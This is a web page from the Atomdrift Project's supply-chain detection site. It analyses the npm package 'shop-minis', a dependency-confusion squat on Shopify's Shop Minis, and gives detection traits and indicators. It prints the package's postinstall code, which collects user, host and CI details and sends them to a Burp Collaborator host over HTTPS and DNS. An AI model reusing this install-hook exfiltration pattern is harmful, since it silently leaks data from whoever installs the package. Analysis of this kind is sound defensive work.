@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>shop-minis: a Shopify-shaped canary that rats you out to Burp - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="shop-minis: a Shopify-shaped canary that rats you out to Burp - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>shop-minis: a Shopify-shaped canary that rats you out to Burp</h1>
+    <span class="post-meta">2026-05-26 &middot; npm &middot; shop-minis</span>
+  </div>
+  <div class="post-body discovery-body">
+    <p>Shopify ships <a href="https://shop.app/minis">Shop Minis</a>, whose private packages live behind <code>@shopify/</code>. The public, unscoped name <code>shop-minis</code> is the kind of bare string a build script resolves to <a href="http://npmjs.org">npmjs.org</a> when an internal proxy misses. Earlier today <code>lobo_hunt &lt;practiceextraone@gmail.com&gt;</code> registered exactly that name, pushed straight to <code>2.0.5</code>, and self-identified bluntly:</p>
+<ul>
+<li>Description: <code>Security research canary — shopify</code></li>
+<li>Readme (whole file): <code>Takeover By lobo</code></li>
+</ul>
+<p>The entire payload runs from <code>postinstall</code>:</p>
+<pre class="lang-js"><code><span class="tok-kw">const</span> CALLBACK_HOST = <span class="tok-str">'svr57aylqme3zald4p0psi1hw827q1eq.oastify.com'</span>;
+
+<span class="tok-kw">const</span> payload = {
+  whoami:   <span class="tok-fn">get</span>(<span class="tok-str">'whoami'</span>),
+  id:       <span class="tok-fn">get</span>(<span class="tok-str">'id'</span>),
+  hostname: os.<span class="tok-fn">hostname</span>(),
+  platform: os.<span class="tok-fn">platform</span>(),
+  cwd:      process.cwd(),
+  ci:       process.env.CI || <span class="tok-str">''</span>,
+  github:   process.env.GITHUB_REPOSITORY || <span class="tok-str">''</span>,
+  node_env: process.env.NODE_ENV || <span class="tok-str">''</span>,
+};
+
+<span class="tok-kw">const</span> path = <span class="tok-str">'/shopify?'</span> + <span class="tok-kw">new</span> <span class="tok-fn">URLSearchParams</span>(payload).<span class="tok-fn">toString</span>();
+https.<span class="tok-fn">get</span>({ host: CALLBACK_HOST, path, timeout: <span class="tok-num">5000</span> }, () =&gt; {}).<span class="tok-fn">on</span>(<span class="tok-str">'error'</span>, () =&gt; {});
+
+<span class="tok-builtin">require</span>(<span class="tok-str">'dns'</span>).<span class="tok-fn">lookup</span>(<span class="tok-tmpl">`<span class="tok-tmpl-expr">${payload.whoami}</span>.<span class="tok-tmpl-expr">${CALLBACK_HOST}</span>`</span>, () =&gt; {});
+</code></pre>
+<p><code>oastify.com</code> is PortSwigger's Burp Collaborator, polling for any HTTP, DNS, or SMTP interaction against that random subdomain. The two channels are deliberate: the HTTPS GET carries the structured payload, and the DNS lookup leaks <code>whoami</code> as the leftmost label, so a strict egress allowlist that blocks outbound HTTPS still surfaces it to the resolver — and the <code>/shopify</code> path makes the target explicit, anything that detonates this resolved the bare name against the public registry. The <code>lobo_hunt</code> publisher, the Burp Collaborator instance, and the &quot;Takeover By lobo&quot; readme read as bug-bounty research, a different cluster from <a href="/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/">the web-dotenv campaign</a> earlier today, but the recipe lands the same either way.</p>
+<h2 id="traits-observed" tabindex="-1"><a class="header-anchor" href="#traits-observed"><span>Traits observed</span></a></h2>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/dependency-confusion/namespace-squat</code></td>
+<td>Public unscoped <code>shop-minis</code> shadowing Shopify's internal Shop Minis package</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/recon-exfil/install-hook</code></td>
+<td><code>postinstall</code> fires <code>node postinstall.js</code> and exfils on every install</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/supply-chain/recon-exfil/pipeline</code></td>
+<td>Collects <code>CI</code> and <code>GITHUB_REPOSITORY</code> from the runner's environment</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/exfiltration/covert-channel/dns/subdomain-label</code></td>
+<td><code>dns.lookup(\</code>${whoami}.<burp>`)` leaks identity past HTTPS egress blocks</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/command-and-control/infrastructure/burp-collaborator</code></td>
+<td>C2 host is a Burp Collaborator subdomain on <code>oastify.com</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/exfiltration/sensitive-data/javascript/js-system-info-exfiltration</code></td>
+<td><code>whoami</code>, <code>id</code>, <code>hostname</code>, <code>platform</code>, <code>cwd</code> shipped as URL params</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>objectives/discovery/system/fingerprint/runtime</code></td>
+<td><code>whoami</code> / <code>id</code> via <code>execSync</code> plus <code>os.hostname()</code>, <code>os.platform()</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>metadata/package/fields/bin</code></td>
+<td>Declared <code>bin: discovery-build</code> alongside the <code>postinstall</code> trigger</td>
+</tr>
+<tr>
+<td><span class="sev-dot notable" title="notable"></span></td>
+<td><code>objectives/supply-chain/metadata-anomaly/package/npm</code></td>
+<td>Self-described &quot;Security research canary — shopify&quot;, one-line <code>Takeover By lobo</code> readme, no repository URL</td>
+</tr>
+</tbody>
+</table>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Package</td>
+<td><code>shop-minis@2.0.5</code> (npm)</td>
+</tr>
+<tr>
+<td>npm page</td>
+<td><a href="https://www.npmjs.com/package/shop-minis">npmjs.com/package/shop-minis</a></td>
+</tr>
+<tr>
+<td>Published</td>
+<td><code>2026-05-26T12:06:21Z</code></td>
+</tr>
+<tr>
+<td>Tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/4be8db89785114ce9919d6d822f8363725890fa6cc2fa567a5fd73ee72854016"><code>4be8db89785114ce9919d6d822f8363725890fa6cc2fa567a5fd73ee72854016</code></a></td>
+</tr>
+<tr>
+<td>Tarball SHA-1 (npm <code>shasum</code>)</td>
+<td><code>f556b4533e1bcc01f0a1bc5f7af50eba85ad4303</code></td>
+</tr>
+<tr>
+<td><code>postinstall.js</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/7fc4ea8b86c27e4111b2dc03ad327de9dc80ee686f0443edc0171645f46f6bbb"><code>7fc4ea8b86c27e4111b2dc03ad327de9dc80ee686f0443edc0171645f46f6bbb</code></a></td>
+</tr>
+<tr>
+<td>HTTPS exfil</td>
+<td><code>https://svr57aylqme3zald4p0psi1hw827q1eq.oastify.com/shopify?…</code></td>
+</tr>
+<tr>
+<td>DNS exfil</td>
+<td><code>&lt;whoami&gt;.svr57aylqme3zald4p0psi1hw827q1eq.oastify.com</code></td>
+</tr>
+<tr>
+<td>Publisher</td>
+<td><code>lobo_hunt &lt;practiceextraone@gmail.com&gt;</code></td>
+</tr>
+</tbody>
+</table>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
